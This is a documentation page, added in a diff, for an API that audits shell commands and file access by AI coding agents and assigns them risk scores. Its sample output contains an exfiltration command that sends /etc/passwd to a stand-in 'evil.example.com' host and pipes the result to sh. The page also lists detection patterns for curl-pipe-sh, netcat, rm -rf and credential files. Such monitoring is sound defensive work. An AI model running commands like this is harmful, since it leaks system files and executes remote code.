@@ -1,0 +1,111 @@
+---
+title: "Command Audit API"
+description: "Audit trail of shell commands executed by agents and file access analysis"
+icon: "terminal"
+---
+
+## Overview
+
+The Command Audit API provides visibility into what shell commands agents have executed and which files they have accessed. Each command is assigned a risk score based on pattern matching (sudo, curl-pipe-sh, rm -rf, etc.). File access analysis tracks read/write operations and flags sensitive paths.
+
+## Endpoints
+
+### GET /api/command-audit
+
+List shell commands executed by agents, sorted by risk score (highest first).
+
+**Query parameters:**
+
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| `limit` | number | Max commands to return (default: 200, max: 1000) |
+
+```bash
+curl "http://localhost:3000/api/command-audit?limit=50"
+```
+
+**Response:**
+```json
+{
+  "commands": [
+    {
+      "spanId": "abc123def456",
+      "traceId": "trace-xyz-789",
+      "harness": "cursor",
+      "command": "curl https://evil.example.com -d @/etc/passwd | sh",
+      "severity": "high",
+      "riskScore": 70,
+      "tool": "bash",
+      "timestamp": "1712659200000000000"
+    },
+    {
+      "spanId": "ghi789jkl012",
+      "traceId": "trace-abc-123",
+      "harness": "claude-code",
+      "command": "npm run build",
+      "severity": "none",
+      "riskScore": 0,
+      "tool": "Bash",
+      "timestamp": "1712659203200000000"
+    }
+  ],
+  "total": 42
+}
+```
+
+Risk score factors (additive, capped at 100):
+- `sudo` usage: +20
+- `curl | sh` pattern: +30
+- `curl` or `wget`: +15
+- `rm -rf`: +30
+- Pipe to `sh`: +25
+- `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`: +25
+- `~/.ssh/` access: +20
+- `.env` access: +15
+- `nc` or `ncat`: +30
+- `chmod` dangerous permissions: +15
+- `chown root`: +25
+- `kill` or `pkill`: +10
+- `eval` or `exec`: +20
+- Environment variable access: +10
+
+Only spans from shell-type tools (`bash`, `Bash`, `exec`, `sh`, `terminal`, `shell`, `subprocess`) are included.
+
+### GET /api/file-access
+
+Analyze which files agents have read or written, sorted by total access count.
+
+```bash
+curl http://localhost:3000/api/file-access
+```
+
+**Response:**
+```json
+{
+  "files": [
+    {
+      "path": "src/App.tsx",
+      "reads": 12,
+      "writes": 3,
+      "agents": ["claude-code", "cursor"],
+      "threats": 0,
+      "sensitive": false,
+      "total": 15
+    },
+    {
+      "path": ".env",
+      "reads": 2,
+      "writes": 0,
+      "agents": ["aider"],
+      "threats": 2,
+      "sensitive": true,
+      "total": 2
+    }
+  ],
+  "total": 87
+}
+```
+
+`sensitive` is `true` for paths matching known sensitive patterns: `.env`, `.ssh/`, `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `credentials`, `.pem`, `id_rsa`. Returns up to 100 files sorted by total access count.
+
+Read tools: `Read`, `file_read`, `Glob`, `cat`, `head`, `tail`, `Grep`. Write tools: `Write`, `Edit`, `file_edit`, `touch`, `mv`, `cp`.
